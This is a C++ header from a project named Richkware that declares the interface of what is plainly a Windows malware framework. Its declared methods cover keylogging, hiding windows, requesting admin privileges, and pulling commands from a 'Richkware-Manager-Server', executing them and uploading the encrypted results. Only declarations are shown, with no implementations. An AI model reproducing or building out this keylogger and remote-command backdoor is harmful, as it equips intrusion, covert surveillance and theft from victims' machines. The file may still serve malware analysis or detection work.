/*
*      Copyright 2016 Riccardo Melioli.
*/

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#define _WIN32_WINNT 0x501

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <winreg.h>
#include <winuser.h>
//#include <ws2tcpip.h>

#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>

#include "utils.h"
#include "crypto.h"
#include "blockApps.h"
#include "network.h"
#include "storage.h"

class Richkware {
private:
    std::string appName;
    std::string encryptionKey;
public:
    BlockApps blockApps;
    Network network;
    Session session;
    SystemStorage systemStorage;

    Richkware(const char *AppNameArg, std::string EncryptionKeyArg);

    //Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
    Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
              const char *port,
              const char *associatedUser);

    BOOL IsAdmin();

    void RequestAdminPrivileges();

    void StealthWindow(const char *window);

    void OpenApp(const char *app);

    void Keylogger(const char *fileName);

    void Hibernation();

    void RandMouse();

    std::vector<std::string> getCommands(const std::string &encryptionKey);

    std::string executeCommand(std::string command);

    void uploadCommandsResponse(std::string output, const std::string &encryptionKey);

};

DWORD WINAPI KeyloggerThread(void *arg);

#endif /* RICHKWARE_H_ */
